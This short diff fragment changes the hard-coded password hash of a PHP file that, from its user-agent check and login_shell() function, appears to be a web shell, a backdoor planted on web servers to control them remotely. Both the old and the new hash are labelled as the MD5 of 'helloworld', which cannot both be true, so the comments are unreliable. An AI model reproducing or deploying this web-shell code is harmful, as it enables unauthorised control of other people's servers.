@@ -22,7 +22,7 @@ if (!empty($_SERVER['HTTP_USER_AGENT'])) {
 	}
 }
 
-$password = "542f87018af36fd7af803515076f54e6"; // md5 : helloworld
+$password = "e69c800da18245cd2bbb8ba1cf563af0"; // md5 : helloworld
 
 function login_shell()
 {
